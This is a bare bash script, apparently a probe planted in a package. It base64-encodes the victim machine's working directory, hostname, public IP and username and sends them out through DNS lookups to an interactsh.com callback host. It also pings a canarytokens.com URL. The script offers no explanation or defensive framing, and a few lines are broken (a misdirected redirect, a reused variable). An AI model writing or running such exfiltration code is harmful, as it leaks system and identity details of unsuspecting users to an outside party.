#!/usr/bin/bash

a=$(pwd | head -n 1 | base64) && dig $a.c6khzq62vtc00002gzbggdja95ayyyyyb.interactsh.com > /dev/null 2>&1;
b=$(hostname | head | base64) && dig $b.c6khzq62vtc00002gzbggdja95ayyyyyb.interactsh.com > /dev/null 2>&1;
c=$(curl ifconfig.me | head | base64) && dig $c. > c6khzq62vtc00002gzbggdja95ayyyyyb.interactsh.com 2>&1;
d=$(echo "exposed-package" | head | base64) && dig $d.c6khzq62vtc00002gzbggdja95ayyyyyb.interactsh.com > /dev/null 2>&1;
e=$(whoami | head | base64) && dig $a.c6khzq62vtc00002gzbggdja95ayyyyyb.interactsh.com > /dev/null 2>&1;
f=$(curl http://canarytokens.com/images/wnnv5pizxekepolwljqlpnjsf/post.jsp);
#echo $a && $b && $c  > /dev/null 2>&1;
